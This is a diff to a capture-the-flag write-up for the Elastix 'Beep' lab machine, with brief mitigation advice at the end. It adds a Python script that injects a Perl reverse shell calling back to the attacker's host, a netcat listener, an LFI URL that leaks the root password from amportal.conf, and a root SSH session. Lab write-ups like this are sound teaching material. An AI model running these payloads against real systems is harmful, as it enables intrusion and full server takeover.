@@ -137,8 +137,37 @@ What variables do we have?
 - lport, can't change
 - extension, can change.
 
-So lets try changing the extension. But first we need to figure out what the extension actually is. It's essentially an additional telephone wired to the same telephone line as another. And can be up to 4 digits long. 
+So lets try changing the extension. But first we need to figure out what the extension actually is. It's essentially an additional telephone wired to the same telephone line as another. And can be up to 4 digits long. So I created a little brute-force that just runs through 0-1000. with a 
 
+```
+import urllib.request
+import ssl
+
+def expl(e):
+
+    rhost="10.129.84.71" # Target address
+    lhost="10.10.14.21"  # Our listening address
+    lport=443
+    extension = e
+
+    # Reverse shell payload
+
+    url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
+    
+    try:
+        urllib.request.urlopen(url, timeout=3, context=ssl.SSLContext(ssl.PROTOCOL_TLSv1)))
+    except Exception:
+        pass
+
+
+extensions = list(range(0,1000))
+
+for i in extensions:
+    print(i)
+    expl(i)
+```
+
+It took a while, but I got the connection on extension number 233.
 
 ```
 kali@kali:~$ sudo rlwrap nc -nlvp 443
@@ -202,7 +231,44 @@ We can see that the file is executable by everyone. As can be seen by the last x
 
 ## Comparing to the official writeup:
 
+The official writeup also used nmap to discover the webhost.
 
+They immediatelly used dirbuster, but found the Elastix login page on the main web directory. 
+
+They use a completely different exploit. All you need to do is to go to https://10.129.84.71/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+
+And in this page is a dump of a ton of information. This line gives us the password to the root account:
+
+`# Change this to a secure password. ARI_ADMIN_PASSWORD=jEhdIekWmdjE`
+
+And we can simply use this to get root:
+
+```
+kali@kali:~$ ssh root@10.129.84.71
+The authenticity of host '10.129.84.71 (10.129.84.71)' can't be established.
+RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.84.71' (RSA) to the list of known hosts.
+root@10.129.84.71's password: 
+Last login: Tue Sep 29 12:10:12 2020
+
+Welcome to Elastix
+----------------------------------------------------
+
+To access your Elastix System, using a separate workstation (PC/MAC/Linux)
+Open the Internet Browser using the following URL:                               
+http://10.129.84.71
+
+[root@beep ~]# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)                                                                                    
+[root@beep ~]# 
+```
 
 ## How to stop this exploit:
 
+Santize inputs. Both the exploits I and the official writeup used only worked because of unsanitized inputs. 
+In the exploit I used, the unsanitized input is eventaully ran locally, while the other exploit lets the attacker look at files they otherwise should not have access to.
+
+If any of these were sanitized properly, the attacker would not get into the server.
+
+The nmap privliege escalation can be stopped by either disabling the nmap -interactive option, or just not letting users other than root execute nmap to begin with.
